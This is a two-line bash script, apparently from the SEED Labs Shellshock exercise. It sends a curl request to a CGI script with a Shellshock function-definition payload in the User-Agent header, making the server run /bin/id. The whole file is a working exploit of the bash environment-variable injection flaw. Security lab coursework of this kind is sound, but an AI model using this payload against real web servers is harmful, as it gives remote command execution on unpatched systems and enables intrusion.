#!/bin/bash

curl -A " () { cat; }; echo; /bin/id" www.seedlab-shellshock.com/cgi-bin/vul.cgi
